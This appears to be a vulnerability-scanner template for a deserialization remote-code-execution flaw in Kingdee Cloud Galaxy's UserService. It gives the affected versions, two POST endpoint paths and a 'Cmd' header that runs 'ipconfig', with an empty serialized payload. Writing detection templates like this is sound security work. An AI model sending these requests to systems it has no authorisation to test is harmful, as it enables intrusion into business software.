id: kingdee-cloud-user-deserialization-rce

info:
  name: 金蝶云星空 UserService 反序列化远程代码执行
  author: zan8in
  severity: critical
  verified: true
  description: |-
    金蝶云星空 UserService 存在反序列化远程代码执行漏洞，攻击者可通过构造恶意的请求参数，通过反序列化漏洞执行任意代码。
  affected: |-
    金蝶云星空 6.x <= 6.2.1012.4 7.0.352.16 <= 金蝶云星空 7.x <= 7.7.0.202111 8.0.0.202205 <= 金蝶云星空 8.x <= 8.1.0.20221110
  references:
    - https://mp.weixin.qq.com/s/m8Z7pRjETAFw3Akk1ZETLw
  tags: kingdee,rce,deserialization
  created: 2024/11/19

set:
  payloadBody: base64Decode("")
  cmd: "ipconfig"
rules:
  r0:
    request:
      method: POST
      path: /K3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc
      headers:
        Content-Type: text/json
        Cmd: "{{cmd}}"
      body: "{{payloadBody}}"
    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
  r1:
    request:
      method: POST
      path: /Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc
      headers:
        Content-Type: text/json
        Cmd: "{{cmd}}"
      body: "{{payloadBody}}"
    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
expression: r0() || r1()
